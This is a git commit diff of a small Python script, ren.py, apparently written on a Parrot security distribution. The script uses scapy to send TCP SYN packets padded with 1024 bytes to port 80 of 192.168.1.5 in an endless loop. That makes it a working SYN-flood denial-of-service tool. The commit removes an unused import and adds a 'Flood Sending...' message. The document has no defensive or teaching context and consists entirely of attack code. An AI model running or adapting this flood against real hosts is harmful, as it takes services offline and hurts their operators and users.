ef000a13befd438bd62f455a02a1c000da0ed51a
Parrot Live user <user@localhost.localdomain>
2024-12-03 21:50:19 +0000

    wild

--- ren.py
+++ ren.py
@@ -1,6 +1,5 @@
 import sys,os
 from scapy.all import *
-import threading
 target='192.168.1.5'
 port=80
 ip=IP(dst=target)
@@ -8,3 +7,4 @@ tcp=TCP(sport=RandShort(),dport=port,flags="S")
 raw=Raw(b"X"*1024)
 packets=ip/tcp/raw
 send(packets,loop=1,verbose=0)
+print("(+)Flood Sending...")
